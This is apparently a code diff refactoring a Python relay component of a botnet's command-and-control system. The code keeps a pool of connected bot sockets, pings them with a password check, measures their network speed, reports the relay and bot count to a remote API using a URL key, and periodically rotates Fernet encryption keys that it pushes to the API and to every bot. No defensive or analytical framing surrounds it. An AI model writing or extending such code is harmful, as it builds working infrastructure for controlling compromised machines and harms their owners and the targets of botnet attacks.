@@ -1,8 +1,10 @@
-import time
-from requests import get as rget
+from time import sleep
+from requests import (
+    get as rget,
+    Response,
+)
 from socket import socket as Sock
 from cryptography.fernet import Fernet
-from colorama import Fore
 from .config import RelayConfig
 
 class Loops():
@@ -36,7 +38,7 @@ class Loops():
         ip: str = data['ip']
         bots = data['bots']
 
-        url: str = f"{self.config.API_URL}/relays.php?urlkey={self.config.URL_KEY}&ip={ip}&bots={bots}&act={act}"
+        url: str = f"{self.config.API_URL}/relays_edit?urlkey={self.config.URL_KEY}&action={act}&ip={ip}&bots={bots}"
 
         try:
             res: str = rget(url, timeout=5000).json()
@@ -60,7 +62,7 @@ class Loops():
 
     def ping(self) -> None:
         while 1:
-            for bot in self.config.bots.copy().keys():
+            for bot in self.config.bots_sock.copy().keys():
                 try:
                     bot.settimeout(3)
                     self.send(bot, 'PING', False, False)
@@ -68,20 +70,18 @@ class Loops():
                     data: str = bot.recv(1024).decode()
 
                     if data != f'PONG[p:{self.config.PASSWD}]':
-                        self.config.bots.pop(bot)
+                        self.config.bots_sock.pop(bot)
                         bot.close()
 
                 except Exception:
-                    self.config.bots.pop(bot)
+                    self.config.bots_sock.pop(bot)
                     bot.close()
 
-            time.sleep(self.config.relay_time.PING)
+            sleep(self.config.relay_time.PING)
 
     def net(self) -> None:
         while 1:
-            self.config.speed.clear()
-
-            for bot in self.config.bots.copy().keys():
+            for bot in self.config.bots_sock.copy().keys():
                 try:
                     bot.settimeout(3)
                     self.send(bot, f'NETSPEED', False, False)
@@ -90,74 +90,68 @@ class Loops():
 
                     try:
                         if not int(data):
-                            self.config.bots.pop(bot)
+                            self.config.bots_sock.pop(bot)
                             bot.close()
                             continue
 
-                        self.config.speed.append(int(data))
+                        self.config.bot_speed = int(data)
 
                     except Exception:
-                        self.config.bots.pop(bot)
+                        self.config.bots_sock.pop(bot)
                         bot.close()
 
                 except Exception:
-                    self.config.bots.pop(bot)
+                    self.config.bots_sock.pop(bot)
                     bot.close()
 
-            time.sleep(self.config.relay_time.NET)
+            sleep(self.config.relay_time.NET)
 
-
-
-    def api_key(self, gkey: str):
-        url=f"{self.config.API_URL}/genkey.php?urlkey={self.config.URL_KEY}&gkey={gkey}"
+    def set_swap_key(self, swap_key: str) -> bool:
+        url: str = f"{self.config.API_URL}/swap_key?urlkey={self.config.URL_KEY}&key={swap_key}"
         try:
-            res = rget(url, timeout=5000).json()
-            self.log(res)
+            res: Response = rget(
+                url,
+                timeout=5000,
+            )
 
-            return res == "ok"
+            return res.status_code == 200
 
         except Exception as e:
-            self.log(f"error \n{url}\n{e}\n\n")
+            self.log(f"error \n{url}\ngetting: {e}\n\n")
             return False
 
-
-
-    def genkey(self) -> None:
+    def gen_swap_key(self) -> None:
         while 1:
-            time.sleep(self.config.relay_time.GENKEY)
-            self.config.gen_key.clear()
+            sleep(self.config.relay_time.GENKEY)
 
-            ngkey=Fernet.generate_key().decode()
-            self.log(ngkey)
-            self.config.gen_key.append(ngkey)
+            new_swap_key = Fernet.generate_key().decode()
+            self.log(new_swap_key)
 
-            k: list = []
-            ke: list = []
+            self.config.swap_key = new_swap_key
 
-            if self.config.old_gen_key != []:
-                f: Fernet = Fernet(self.config.old_gen_key[0])
-                k.append(f.encrypt(f'GKEY:[{ngkey}]'.encode()).decode())
+            swap_key: str = None
+            is_first: bool = False
 
-                for i in k:
-                    if self.api_key(i): self.log("apikey op")
-                    else: self.log("apikey error")
+            # if the old swap key already exists, we encrypt this one with the old
+            if self.config.swap_key_old is not None:
+                f: Fernet = Fernet(self.config.swap_key_old)
+                swap_key = f.encrypt(f'GKEY:[{new_swap_key}]'.encode()).decode()
+
             else:
-                ke.append(self.crypt(f'GKEY:[{ngkey}]'.encode()).decode())
-                for i in ke:
-                    if self.api_key(i): self.log("apikey op")
-                    else: self.log("apikey error")
+                is_first = True
+                swap_key = self.crypt(f'GKEY:[{new_swap_key}]'.encode()).decode()
 
-            for bot in self.config.bots.copy().keys():
+            # send the new swap key to the api
+            if self.set_swap_key(swap_key): self.log("apikey op")
+            else: self.log("apikey error")
+
+            for bot in self.config.bots_sock.copy().keys():
                 try:
                     bot.settimeout(3)
-                    if k != []:
-                        for i in k: self.send(bot, i, False, False)
 
-                    elif ke != []:
-                        for i in ke: self.send(bot, f"GK{i}", False, False)
-
-                    else: self.log("error")
+                    if is_first: self.send(bot, f"GK{swap_key}", False, False)
+                    else: self.send(bot, swap_key, False, False)
 
                 except Exception:
-                    self.config.bots.pop(bot)
+                    self.config.bots_sock.pop(bot)
                     bot.close()
